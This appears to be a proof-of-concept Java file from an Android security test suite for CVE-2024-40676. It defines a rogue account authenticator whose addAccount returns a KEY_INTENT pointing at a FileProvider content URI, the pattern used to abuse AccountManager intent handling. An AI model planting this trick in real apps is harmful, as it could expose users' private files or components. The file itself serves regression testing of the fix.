/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_40676;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;

import java.io.File;

public class AccountService extends Service {

    public AccountService() {}

    @Override
    public IBinder onBind(Intent intent) {
        return new PocAccountAuthenticator(this).getIBinder();
    }

    private static class PocAccountAuthenticator extends AbstractAccountAuthenticator {
        private Context mContext;

        public PocAccountAuthenticator(Context context) {
            super(context);
            mContext = context;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
            return null;
        }

        @Override
        public Bundle addAccount(
                AccountAuthenticatorResponse response,
                String accountType,
                String authTokenType,
                String[] requiredFeatures,
                Bundle options)
                throws NetworkErrorException {
            try {
                // Return key intent with content data scheme
                final Intent keyIntent =
                        new Intent(Intent.ACTION_VIEW)
                                .setData(
                                        PocFileProvider.getUriForFile(
                                                mContext,
                                                mContext.getPackageName() + ".FileProvider",
                                                new File(
                                                        mContext.getFilesDir().getAbsolutePath()
                                                                + "/cve_2024_40076_file")));
                final Bundle result = new Bundle();
                result.putParcelable(AccountManager.KEY_INTENT, keyIntent);

                // Send broadcast to DeviceTest indicating the occurrence of any exceptions here
                sendBroadcast((Exception) null);
                return result;
            } catch (Exception e) {
                try {
                    sendBroadcast(e);
                } catch (Exception ignore) {
                    // Ignore unintended exceptions
                }
                return null;
            }
        }

        @Override
        public Bundle confirmCredentials(
                AccountAuthenticatorResponse response, Account account, Bundle options)
                throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle getAuthToken(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return null;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle updateCredentials(
                AccountAuthenticatorResponse response,
                Account account,
                String authTokenType,
                Bundle options)
                throws NetworkErrorException {
            return null;
        }

        @Override
        public Bundle hasFeatures(
                AccountAuthenticatorResponse response, Account account, String[] features)
                throws NetworkErrorException {
            return null;
        }

        private void sendBroadcast(Exception e) {
            mContext.sendBroadcast(
                    new Intent(mContext.getString(R.string.broadcastAction))
                            .putExtra(mContext.getString(R.string.accountServiceException), e));
        }
    }
}
